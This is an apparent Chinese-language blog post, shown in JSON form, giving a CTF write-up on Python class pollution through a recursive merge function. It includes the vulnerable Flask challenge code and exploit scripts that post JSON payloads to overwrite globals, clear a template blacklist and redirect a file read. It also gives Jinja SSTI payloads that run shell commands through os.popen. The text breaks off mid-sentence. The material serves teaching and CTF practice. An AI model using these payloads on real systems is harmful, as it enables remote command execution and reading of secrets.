{"title":"python原型链污染","uid":"968c5d6624aab9225eba1668a49a3a02","slug":"python原型链污染","date":"2024-11-12T12:07:29.000Z","updated":"2024-11-12T12:13:06.680Z","comments":true,"path":"api/articles/python原型链污染.json","keywords":null,"cover":"/image/7.png","content":"<h1 id=\"python变种原型链污染\"><a href=\"#python变种原型链污染\" class=\"headerlink\" title=\"python变种原型链污染\"></a>python变种原型链污染</h1><p>**<code>dst.get(k)</code>**：<br> 这是在字典 <code>dst</code> 中查找键 <code>k</code> 对应的值。如果键 <code>k</code> 存在，则返回对应的值；如果键 <code>k</code> 不存在，则返回 <code>None</code>（如果没有指定默认值的话）。例如：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dst = &#123;&#x27;a&#x27;: 1, &#x27;b&#x27;: 2&#125;</span><br><span class=\"line\">value = dst.get(&#x27;b&#x27;)  # 返回 2</span><br><span class=\"line\">value = dst.get(&#x27;c&#x27;)  # 返回 None，因为 &#x27;c&#x27; 不存在</span><br></pre></td></tr></table></figure>\n\n<p><code>hasattr</code> 只是检查对象是否具有某个属性</p>\n<p><code>getattr</code> 用于获取对象的属性值，如果该属性不存在，可以指定一个默认值，避免抛出异常</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">setattr(object, name, value)</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">setattr` 函数会将指定的值 `value` 赋给对象 `object` 的属性 `name</span><br></pre></td></tr></table></figure>\n\n<p><code>merge(src, dst)</code> 就是将 <code>src</code> 字典的内容合并到 <code>dst</code> 字典中</p>\n<h2 id=\"危险代码-（特征）\"><a href=\"#危险代码-（特征）\" class=\"headerlink\" title=\"危险代码 （特征）\"></a>危险代码 （特征）</h2><p>又ssti基础的也好理解，好入门</p>\n<p>merge 合并函数</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">merge</span>(<span class=\"params\">src, dst</span>): </span><br><span class=\"line\">    <span class=\"keyword\">for</span> k, v <span class=\"keyword\">in</span> src.items():</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">hasattr</span>(dst, <span class=\"string\">&#x27;__getitem__&#x27;</span>):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> dst.get(k) <span class=\"keyword\">and</span> <span class=\"built_in\">type</span>(v) == <span class=\"built_in\">dict</span>:</span><br><span class=\"line\">                merge(v, dst.get(k))</span><br><span class=\"line\">                </span><br><span class=\"line\">                </span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                dst[k] = v</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">hasattr</span>(dst, k) <span class=\"keyword\">and</span> <span class=\"built_in\">type</span>(v) == <span class=\"built_in\">dict</span>:</span><br><span class=\"line\">            merge(v, <span class=\"built_in\">getattr</span>(dst, k))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"built_in\">setattr</span>(dst, k, v)</span><br><span class=\"line\">            </span><br><span class=\"line\">src = &#123;<span class=\"string\">&#x27;a&#x27;</span>: <span class=\"number\">1</span>, <span class=\"string\">&#x27;b&#x27;</span>: &#123;<span class=\"string\">&#x27;x&#x27;</span>: <span class=\"number\">10</span>, <span class=\"string\">&#x27;y&#x27;</span>: <span class=\"number\">20</span>&#125;, <span class=\"string\">&#x27;c&#x27;</span>: <span class=\"number\">3</span>&#125;</span><br><span class=\"line\">dst = &#123;<span class=\"string\">&#x27;a&#x27;</span>: <span class=\"number\">0</span>, <span class=\"string\">&#x27;b&#x27;</span>: &#123;<span class=\"string\">&#x27;x&#x27;</span>: <span class=\"number\">5</span>&#125;, <span class=\"string\">&#x27;d&#x27;</span>: <span class=\"number\">4</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">merge(src, dst)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(dst)</span><br></pre></td></tr></table></figure>\n\n\n\n<p>我们可以通过对控制src的中的键和值，从而来改变dst的值</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">merge</span>(<span class=\"params\">src, dst</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> k, v <span class=\"keyword\">in</span> src.items():</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">hasattr</span>(dst, <span class=\"string\">&#x27;__getitem__&#x27;</span>):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> dst.get(k) <span class=\"keyword\">and</span> <span class=\"built_in\">type</span>(v) == <span class=\"built_in\">dict</span>:</span><br><span class=\"line\">                merge(v, dst.get(k))</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                dst[k] = v</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">hasattr</span>(dst, k) <span class=\"keyword\">and</span> <span class=\"built_in\">type</span>(v) == <span class=\"built_in\">dict</span>:</span><br><span class=\"line\">            merge(v, <span class=\"built_in\">getattr</span>(dst, k))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"built_in\">setattr</span>(dst, k, v)</span><br><span class=\"line\">            </span><br><span class=\"line\">            </span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">A</span>:</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">B</span>:</span><br><span class=\"line\">    classa = <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">a = <span class=\"number\">1</span></span><br><span class=\"line\">instance = A()</span><br><span class=\"line\">payload = &#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;__init__&quot;</span>: &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;__globals__&quot;</span>: &#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;a&quot;</span>: <span class=\"number\">4</span>,</span><br><span class=\"line\">            <span class=\"string\">&quot;B&quot;</span>: &#123;</span><br><span class=\"line\">                <span class=\"string\">&quot;classa&quot;</span>: <span class=\"number\">5</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(B.classa)  <span class=\"comment\"># 2</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(a)         <span class=\"comment\"># 1</span></span><br><span class=\"line\">merge(payload, instance)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(B.classa)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(a)</span><br></pre></td></tr></table></figure>\n\n<p><strong>构造方法（<code>__init__()</code>）</strong>：在对象创建时调用，用于初始化对象的状态</p>\n<p><strong><code>config.__class__.__init__</code></strong>: 每个类都有一个 <code>__init__</code> 方法（如果类没有定义 <code>__init__</code>，则使用默认的 <code>__init__</code>）。通过 <code>config.__class__.__init__</code>，你访问到了该类的初始化方法。</p>\n<p><strong><code>config.__class__.__init__.__globals__</code></strong>: 这是一个关键部分。每个函数对象（包括类的 <code>__init__</code> 方法）都有一个 <code>__globals__</code> 属性，它指向该函数所在模块的全局命名空间。<code>__globals__</code> 是一个字典，包含了在该函数定义的模块中的所有全局变量。这意味着，通过 <code>__globals__</code>，你可以访问到定义该函数的模块中可用的任何全局变量。</p>\n<p>自行控制的payload作为src传入merge函数，目标实例instance作为dst传入</p>\n<p>参考文章<a href=\"https://xz.aliyun.com/t/13072#toc-13\">https://xz.aliyun.com/t/13072#toc-13</a></p>\n<h2 id=\"python原型链污染\"><a href=\"#python原型链污染\" class=\"headerlink\" title=\"python原型链污染\"></a>python原型链污染</h2><h3 id=\"Jinja-Mark\"><a href=\"#Jinja-Mark\" class=\"headerlink\" title=\"Jinja Mark\"></a>Jinja Mark</h3><h3 id=\"绕过黑名单\"><a href=\"#绕过黑名单\" class=\"headerlink\" title=\"绕过黑名单\"></a>绕过黑名单</h3><p>进入到&#x2F;index <strong>进行ssti注入发现有黑名单</strong>，查看提示发现是</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">BLACKLIST_IN_index = [<span class=\"string\">&#x27;&#123;&#x27;</span>,<span class=\"string\">&#x27;&#125;&#x27;</span>]</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">merge</span>(<span class=\"params\">src, dst</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> k, v <span class=\"keyword\">in</span> src.items():</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">hasattr</span>(dst, <span class=\"string\">&#x27;__getitem__&#x27;</span>):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> dst.get(k) <span class=\"keyword\">and</span> <span class=\"built_in\">type</span>(v) == <span class=\"built_in\">dict</span>:</span><br><span class=\"line\">                merge(v, dst.get(k))</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                dst[k] = v</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">hasattr</span>(dst, k) <span class=\"keyword\">and</span> <span class=\"built_in\">type</span>(v) == <span class=\"built_in\">dict</span>:</span><br><span class=\"line\">            merge(v, <span class=\"built_in\">getattr</span>(dst, k))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"built_in\">setattr</span>(dst, k, v)</span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/magic&#x27;</span>,methods=[<span class=\"string\">&#x27;POST&#x27;</span>, <span class=\"string\">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">pollute</span>():</span><br><span class=\"line\">    <span class=\"keyword\">if</span> request.method == <span class=\"string\">&#x27;POST&#x27;</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> request.is_json:</span><br><span class=\"line\">            merge(json.loads(request.data), instance)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">&quot;这个魔术还行吧&quot;</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">&quot;我要json的魔术&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&quot;记得用POST方法把魔术交上来&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>需要将黑名单ban掉，<strong>将payload以json的格式通过POST传入 &#x2F;magic</strong> exp如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 构建要发送的 payload</span></span><br><span class=\"line\">payload = &#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;__class__&quot;</span>: &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;__init__&quot;</span>: &#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;__globals__&quot;</span>: &#123;</span><br><span class=\"line\">                <span class=\"string\">&quot;BLACKLIST_IN_index&quot;</span>: []</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 payload 转换为 JSON 格式</span></span><br><span class=\"line\">json_payload = json.dumps(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 定义 URL</span></span><br><span class=\"line\">url = <span class=\"string\">&quot;http://gz.imxbt.cn:20155/magic&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 打印请求的键和值</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;请求的 URL:&quot;</span>, url)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;请求的头部信息:&quot;</span>, &#123;<span class=\"string\">&#x27;Content-Type&#x27;</span>: <span class=\"string\">&#x27;application/json&#x27;</span>&#125;)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;请求的 Payload:&quot;</span>, json_payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    <span class=\"comment\"># 发送 POST 请求</span></span><br><span class=\"line\">    response = requests.post(url, data=json_payload, headers=&#123;<span class=\"string\">&#x27;Content-Type&#x27;</span>: <span class=\"string\">&#x27;application/json&#x27;</span>&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 打印响应内容</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;状态码:&quot;</span>, response.status_code)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;响应内容:&quot;</span>, response.text)</span><br><span class=\"line\"><span class=\"keyword\">except</span> requests.exceptions.RequestException <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;请求发生错误:&quot;</span>, e)</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload = &#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;__init__&quot;</span>: &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;__globals__&quot;</span>: &#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;BLACKLIST_IN_index&quot;</span>: []</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>发送响应的json字符串</p>\n<p><img src=\"/post/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20241014155227175.png\"></p>\n<h3 id=\"SSTI注入\"><a href=\"#SSTI注入\" class=\"headerlink\" title=\"SSTI注入\"></a>SSTI注入</h3><p>再次进行ssti注入发现无黑名单</p>\n<p>最终payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag&#x27;).read()&#125;&#125; </span><br><span class=\"line\">&#123;&#123;lipsum.__globals__.os.popen(&#x27;whoami&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"特殊变量与原型链污染的关系\"><a href=\"#特殊变量与原型链污染的关系\" class=\"headerlink\" title=\"特殊变量与原型链污染的关系\"></a>特殊变量与原型链污染的关系</h2><h3 id=\"圣钥之战1-0\"><a href=\"#圣钥之战1-0\" class=\"headerlink\" title=\"圣钥之战1.0\"></a>圣钥之战1.0</h3><p>在&#x2F;read路由下看到</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask,request</span><br><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">merge</span>(<span class=\"params\">src, dst</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> k, v <span class=\"keyword\">in</span> src.items():</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">hasattr</span>(dst, <span class=\"string\">&#x27;__getitem__&#x27;</span>):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> dst.get(k) <span class=\"keyword\">and</span> <span class=\"built_in\">type</span>(v) == <span class=\"built_in\">dict</span>:</span><br><span class=\"line\">                merge(v, dst.get(k))</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                dst[k] = v</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">hasattr</span>(dst, k) <span class=\"keyword\">and</span> <span class=\"built_in\">type</span>(v) == <span class=\"built_in\">dict</span>:</span><br><span class=\"line\">            merge(v, <span class=\"built_in\">getattr</span>(dst, k))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"built_in\">setattr</span>(dst, k, v)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">is_json</span>(<span class=\"params\">data</span>):</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        json.loads(data)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span> ValueError:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">cls</span>():</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\">instance = cls()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/&#x27;</span>, methods=[<span class=\"string\">&#x27;GET&#x27;</span>, <span class=\"string\">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">hello_world</span>():</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;/static/index.html&#x27;</span>, encoding=<span class=\"string\">&quot;utf-8&quot;</span>).read()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/read&#x27;</span>, methods=[<span class=\"string\">&#x27;GET&#x27;</span>, <span class=\"string\">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Read</span>():</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(__file__, encoding=<span class=\"string\">&quot;utf-8&quot;</span>).read()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">f&quot;J1ngHong说：你想read flag吗？</span></span><br><span class=\"line\"><span class=\"string\">那么圣钥之光必将阻止你！</span></span><br><span class=\"line\"><span class=\"string\">但是小小的源码没事，因为你也读不到flag(乐)</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"subst\">&#123;file&#125;</span></span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/pollute&#x27;</span>, methods=[<span class=\"string\">&#x27;GET&#x27;</span>, <span class=\"string\">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Pollution</span>():</span><br><span class=\"line\">    <span class=\"keyword\">if</span> request.is_json:</span><br><span class=\"line\">        merge(json.loads(request.data),instance)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;J1ngHong说：钥匙圣洁无暇，无人可以污染！&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&quot;J1ngHong说：圣钥暗淡了一点，你居然污染成功了？&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    app.run(host=<span class=\"string\">&#x27;0.0.0.0&#x27;</span>,port=<span class=\"number\">80</span>)</span><br></pre></td></tr></table></figure>\n\n<p>看到&#x2F;read路由是通过<code>__file__</code>来读取文件，<code>__file__</code>的值可以通过merge来修改，直接构造payload</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 构建要发送的 payload</span></span><br><span class=\"line\">payload = &#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;__init__&quot;</span>: &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;__globals__&quot;</span>: &#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;__file__&quot;</span>: <span class=\"string\">&quot;flag&quot;</span> <span class=\"comment\">#/proc/1/environ</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 payload 转换为 JSON 格式</span></span><br><span class=\"line\">json_payload = json.dumps(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 定义 URL</span></span><br><span class=\"line\">url = <span class=\"string\">&quot;http://gz.imxbt.cn:20199/pollute&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 打印请求的键和值</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;请求的 URL:&quot;</span>, url)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;请求的头部信息:&quot;</span>, &#123;<span class=\"string\">&#x27;Content-Type&#x27;</span>: <span class=\"string\">&#x27;application/json&#x27;</span>&#125;)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;请求的 Payload:&quot;</span>, json_payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    <span class=\"comment\"># 发送 POST 请求</span></span><br><span class=\"line\">    response = requests.post(url, data=json_payload, headers=&#123;<span class=\"string\">&#x27;Content-Type&#x27;</span>: <span class=\"string\">&#x27;application/json&#x27;</span>&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 打印响应内容</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;状态码:&quot;</span>, response.status_code)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;响应内容:&quot;</span>, response.text)</span><br><span class=\"line\"><span class=\"keyword\">except</span> requests.exceptions.RequestException <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;请求发生错误:&quot;</span>, e)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>再次访问&#x2F;read即可</p>\n<p><code>/proc/1/environ 文件用于存放进程 ID 为 1 的进程（通常是 init 或 systemd）的环境变量。该文件包含了一系列以空字符 (\\0) 